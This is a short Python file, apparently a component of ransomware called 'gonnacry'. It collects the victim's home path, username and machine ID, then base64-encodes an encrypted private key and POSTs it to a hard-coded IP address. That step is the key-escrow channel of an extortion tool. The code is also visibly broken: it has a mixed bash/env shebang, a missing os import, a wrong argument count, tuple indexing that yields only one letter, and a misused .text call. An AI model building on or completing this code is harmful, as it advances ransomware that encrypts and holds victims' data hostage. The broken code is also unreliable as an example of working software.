#!/bin/bash/env python
# coding=UTF-8

import enviroment
import requests 
import base64


ransomware_name = tuple("gonnacry")
server_address = tuple("123.123.123.123")


def send_to_server_encrypted_private_key(id, private_encrypted_key):
    encoded = base64.b64encode(private_encrypted_key)
    address = server_address[0] + '/' + id
    retorno = requests.post(address, encoded)
    private_key = retorno.text()
    with open("private_key", 'w') as f:
        f.write(str(private_key))

        
         

def menu():
    
    # enviroment paths
    home = enviroment.get_home_path()
    desktop = enviroment.get_desktop_path()
    username = enviroment.get_username()
    ransomware_path = os.path.join(home, ransomware_name[0])
    id = enviroment.get_unique_machine_id()


    send_to_server_encrypted_private_key(id)


if __name__ == "__main__": 
    menu()